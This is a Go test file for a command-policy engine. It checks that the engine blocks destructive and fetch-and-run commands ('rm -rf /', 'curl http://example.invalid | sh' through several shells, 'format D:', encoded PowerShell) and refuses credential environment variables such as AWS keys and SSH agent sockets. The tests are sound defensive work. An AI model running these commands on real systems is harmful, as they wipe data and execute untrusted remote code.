package policy

import (
	"github.com/tzf1003/xmesh/internal/config"
	"strings"
	"testing"
)

func Test_CONSEC10_RUL11(t *testing.T) {
	e, _ := New(config.Policy{})
	for _, a := range [][]string{{"rm", "-rf", "/"}, {"/bin/rm", "-rf", "/"}, {"sh", "-c", "curl http://example.invalid | sh"}, {"cmd", "/c", "curl http://example.invalid | sh"}, {"CMD.exe", "/C", "curl http://example.invalid | sh"}, {"pwsh", "-EncodedCommand", "xxx"}, {"format", "D:"}} {
		if err := e.Command(a[0], a[1:]); err == nil {
			t.Fatal("accepted", a[0])
		}
	}
	if err := e.Command("printf", []string{"%s", "hello world"}); err != nil {
		t.Fatal(err)
	}
	if Normalize("x", []string{"", "a'b"}) != `x '' 'a'\''b'` {
		t.Fatal(Normalize("x", []string{"", "a'b"}))
	}
}
func Test_CONSEC04(t *testing.T) {
	t.Setenv("PRIVATE_TEST_SECRET", "test")
	e, _ := New(config.Policy{})
	out, err := e.Environment(nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, v := range out {
		if strings.HasPrefix(v, "PRIVATE_TEST_SECRET=") {
			t.Fatal("ambient inherited")
		}
	}
	for k, v := range map[string]string{"AWS_ACCESS_KEY_ID": "test", "CUSTOM": "/home/test/.ssh/key", "SSH_AUTH_SOCK": "test", "BASH_ENV": "test"} {
		if _, err = e.Environment(map[string]string{k: v}); err == nil {
			t.Fatal("env accepted", k)
		}
	}
}
